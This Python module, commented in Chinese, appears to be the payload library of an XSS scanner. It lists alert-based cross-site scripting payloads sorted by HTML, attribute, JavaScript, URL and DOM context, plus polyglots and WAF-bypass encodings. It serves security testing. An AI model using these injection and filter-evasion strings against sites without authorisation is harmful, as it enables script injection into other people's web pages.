"""
XSS Payload 库 — 按 context 类型组织。

Payload 来源：
- PortSwigger XSS Cheat Sheet
- OWASP XSS Filter Evasion Cheat Sheet
- Dalfox built-in payloads (BSD-2-Clause)
- 自研针对 SPA 框架的 payload

每个 payload 都包含 {MARKER} 占位符，扫描器会替换为唯一 token 用于回显匹配。
"""

from __future__ import annotations

# 唯一 marker 占位符 — 扫描器调用时替换为随机字符串
MARKER = "{MARKER}"

# ============================================================
# 1. 探测 payload — 用最无害的 marker 探测哪个参数有回显
# ============================================================
PROBE_PAYLOADS: list[str] = [
    f"{MARKER}",                          # 纯字符串
    f"<{MARKER}>",                         # 测尖括号
    f'"{MARKER}"',                         # 测双引号
    f"'{MARKER}'",                         # 测单引号
    f"<x{MARKER}>",                        # 测标签起始
]


# ============================================================
# 2. HTML body 上下文 — <div>HERE</div>
# ============================================================
HTML_TEXT_PAYLOADS: list[str] = [
    f"<svg/onload=alert({MARKER})>",
    f"<img src=x onerror=alert({MARKER})>",
    f"<script>alert({MARKER})</script>",
    f"<svg><script>alert&#40;{MARKER}&#41;</script>",
    f"<iframe src=javascript:alert({MARKER})>",
    f"<body onload=alert({MARKER})>",
    f"<details open ontoggle=alert({MARKER})>",
    f"<marquee onstart=alert({MARKER})>",
    # SVG 大小写 + 编码绕过
    f"<SvG/OnLoAd=alert({MARKER})>",
    f"<svg/onload=alert&#x28;{MARKER}&#x29;>",
    # 标签闭合后注入
    f"</textarea><svg/onload=alert({MARKER})>",
    f"</title><svg/onload=alert({MARKER})>",
    f"</style><svg/onload=alert({MARKER})>",
    f"</script><svg/onload=alert({MARKER})>",
]


# ============================================================
# 3. HTML 属性上下文 — <input value="HERE">
# ============================================================
HTML_ATTR_PAYLOADS: list[str] = [
    # 闭合双引号
    f'"><svg/onload=alert({MARKER})>',
    f'" autofocus onfocus=alert({MARKER}) x="',
    # 闭合单引号
    f"'><svg/onload=alert({MARKER})>",
    f"' autofocus onfocus=alert({MARKER}) x='",
    # 没引号的属性
    f" onfocus=alert({MARKER}) autofocus ",
    f"javascript:alert({MARKER})",  # href/src 属性
]

HTML_ATTR_NOQUOTE_PAYLOADS: list[str] = [
    f" onfocus=alert({MARKER}) autofocus ",
    f"/onerror=alert({MARKER})//",
    f"><svg/onload=alert({MARKER})>",
]


# ============================================================
# 4. JS 字符串上下文 — var x = "HERE";
# ============================================================
JS_STRING_PAYLOADS: list[str] = [
    # 闭合双引号
    f'";alert({MARKER});//',
    f'";alert({MARKER});var x="',
    # 闭合单引号
    f"';alert({MARKER});//",
    f"';alert({MARKER});var x='",
    # 反引号模板字符串
    f"`;alert({MARKER});//",
    f"${{alert({MARKER})}}",
    # 闭合 </script> 标签后注入
    f"</script><svg/onload=alert({MARKER})>",
]


# ============================================================
# 5. URL/href 上下文 — <a href="HERE">
# ============================================================
URL_HREF_PAYLOADS: list[str] = [
    f"javascript:alert({MARKER})",
    f"javascript:alert({MARKER})//",
    f"javascript&colon;alert({MARKER})",
    f"data:text/html,<script>alert({MARKER})</script>",
    f"vbscript:msgbox({MARKER})",  # 老 IE
]


# ============================================================
# 6. Polyglot — 一个 payload 打多个 context
# ============================================================
POLYGLOT_PAYLOADS: list[str] = [
    # OWASP/PortSwigger 经典 polyglot
    f"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert({MARKER}) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert({MARKER})//>\\x3e",
    # 同时打 HTML / Attr / JS string
    f"'\"--></style></script><svg onload=alert({MARKER})>",
    f"\"><svg/onload=alert({MARKER})>'",
]


# ============================================================
# 7. DOM XSS 触发 payload — 用于 source=hash/search/postMessage 等
# ============================================================
DOM_HASH_PAYLOADS: list[str] = [
    f"#<img src=x onerror=alert({MARKER})>",
    f"#<svg/onload=alert({MARKER})>",
    f"#javascript:alert({MARKER})",
    f"#{MARKER}",  # 纯标记测 source 是否被回显
]

DOM_SEARCH_PAYLOADS: list[str] = [
    f"?x=<img src=x onerror=alert({MARKER})>",
    f"?x={MARKER}",
]


# ============================================================
# 8. WAF 绕过变体 — 当标准 payload 被过滤时使用
# ============================================================
WAF_BYPASS_PAYLOADS: list[str] = [
    # 大小写混淆
    f"<ScRiPt>alert({MARKER})</ScRiPt>",
    f"<sCrIpT>alert({MARKER})</sCrIpT>",
    # 编码
    f"<svg/onload=&#97;lert({MARKER})>",  # HTML 实体
    f"<svg/onload=\\u0061lert({MARKER})>",  # Unicode 转义
    f"<svg/onload=eval('al'+'ert({MARKER})')>",
    f"<svg/onload=eval(atob('YWxlcnQoMSk='))>",  # base64 (alert(1))
    # 空白字符
    f"<svg\\tonload=alert({MARKER})>",
    f"<svg\\nonload=alert({MARKER})>",
    # 注释拆分
    f"<svg/**/onload=alert({MARKER})>",
    # 标签变体
    f"<video><source onerror=alert({MARKER})>",
    f"<audio src=x onerror=alert({MARKER})>",
    f"<input autofocus onfocus=alert({MARKER})>",
    f"<select autofocus onfocus=alert({MARKER})>",
    f"<textarea autofocus onfocus=alert({MARKER})>",
    # 编码绕过 alert
    f"<svg/onload=top['al'%2b'ert']({MARKER})>",
    f"<svg/onload=window['alert']({MARKER})>",
]


# ============================================================
# 全部 payload 集合（按 context 索引）
# ============================================================
def get_payloads_for_context(context: str) -> list[str]:
    """根据 context 返回最合适的 payload 集。"""
    mapping = {
        "html_text": HTML_TEXT_PAYLOADS + POLYGLOT_PAYLOADS,
        "html_comment": HTML_TEXT_PAYLOADS,
        "html_attr": HTML_ATTR_PAYLOADS,
        "html_attr_noquote": HTML_ATTR_NOQUOTE_PAYLOADS,
        "html_attr_event": URL_HREF_PAYLOADS,
        "js_string": JS_STRING_PAYLOADS,
        "js_template": JS_STRING_PAYLOADS,
        "js_code": JS_STRING_PAYLOADS,
        "css": [],  # CSS context XSS 极其罕见，留空
        "url_path": URL_HREF_PAYLOADS,
        "unknown": POLYGLOT_PAYLOADS + HTML_TEXT_PAYLOADS[:3],
    }
    return mapping.get(context, POLYGLOT_PAYLOADS)


def get_all_test_payloads() -> list[str]:
    """所有可用 payload 的并集（去重）。"""
    seen = set()
    out = []
    for lst in (HTML_TEXT_PAYLOADS, HTML_ATTR_PAYLOADS, JS_STRING_PAYLOADS,
                POLYGLOT_PAYLOADS, WAF_BYPASS_PAYLOADS, URL_HREF_PAYLOADS):
        for p in lst:
            if p not in seen:
                seen.add(p)
                out.append(p)
    return out
